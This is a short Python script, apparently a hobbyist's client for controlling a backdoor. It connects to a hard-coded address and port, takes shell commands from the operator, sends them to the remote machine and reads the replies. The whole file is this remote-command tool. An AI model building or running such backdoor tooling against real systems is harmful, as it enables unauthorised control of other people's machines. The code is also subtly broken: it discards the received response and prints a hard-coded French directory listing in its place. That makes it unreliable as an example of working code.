import socket
import time
import subprocess
import re

ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.135" #ip server
port = 12345 #port server
print("[**] Connecting to the backdoor...")
try: 
    ss.connect((host, port)) #connect to the server
    time.sleep(1)
    print("[**]Connection to the backdoor succeeded")   
    print(f"[**] Successful connection to the backdoor --- ip : {host} ~ port : {port}")
    while True:
        cmd = input('$> ')
        if cmd == "stop":
            print("[**]Connection to the backdoor close...")
            ss.close()
            break
        cmd = str.encode(cmd + '\n')
        ss.send(cmd)
        rsp = ss.recv(1024)
        rsp = str(rsp)
        # Exemple de texte brut
        text = """Le volume dans le lecteur C s'appelle Windows\r\n Le num\x82ro de s\x82rie du volume est 9EC8-B3B1\r\n\r\n R\x82pertoire de C:\\Users\\Fournoy\\Documents\\Python Scripts\\Backdoor\r\n\r\n15/12/2024  12:43    <DIR>          .\r\n15/12/2024  11:37    <DIR>          ..\r\n15/12/2024  14:09               814 client_backdoor.py\r\n15/12/2024  14:09               979 server.py\r\n15/12/2024  14:01               710 test_backdoor.py\r\n               3 fichier(s)            2\xff503 octets\r\n               2 R\x82p(s)  14\xff464\xff442\xff368 octets libres\r\n"""

        # Nettoyage du texte
        cleaned_text = re.sub(r'[\r\n]+', '\n', text)  # Remplacer les retours chariot et nouvelles lignes excessifs
        cleaned_text = cleaned_text.replace('\x82', 'é')  # Remplacer les caractères de type 'é' mal encodés
        cleaned_text = cleaned_text.replace('\xff', '')  # Supprimer les caractères non imprimables

        # Affichage du texte nettoyé
        print(cleaned_text)

except:
        print("Probleme during the connection")
